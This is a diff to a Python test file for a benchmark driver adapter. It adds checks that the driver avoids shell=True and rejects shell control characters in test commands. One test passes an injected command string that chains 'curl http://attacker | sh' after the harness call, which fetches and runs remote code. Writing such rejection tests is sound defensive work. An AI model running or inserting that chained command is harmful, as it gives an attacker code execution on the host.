@@ -365,6 +365,7 @@ def test_adapter_bench_mode_rewrites_correctness_to_benchmark(tmp_path):
     out = _sp.run([sys.executable, driver, "--bench-mode"],
                   capture_output=True, text=True)
     assert "wall_ms: 4.2000" in out.stdout, out.stdout + out.stderr
+    assert "shell=True" not in Path(driver).read_text(encoding="utf-8")
 
 
 def test_adapter_bench_parses_aiter_us_per_iter(tmp_path):
@@ -387,6 +388,15 @@ def test_adapter_bench_parses_aiter_us_per_iter(tmp_path):
     out = _sp.run([sys.executable, driver, "--bench-mode"], capture_output=True, text=True)
     # min(2500,1800)=1800 us -> 1.8 ms; and no --benchmark was appended.
     assert "wall_ms: 1.8" in out.stdout, out.stdout + out.stderr
+
+
+def test_adapter_rejects_shell_control_in_test_command(tmp_path):
+    with pytest.raises(ValueError, match="shell control"):
+        forge_submit._build_driver_adapter(
+            f"{sys.executable} harness.py --correctness && curl http://attacker | sh",
+            str(tmp_path),
+            tmp_path,
+        )
 
 
 def test_report_informational_timing_not_kept_does_not_trigger_keep(tmp_path):
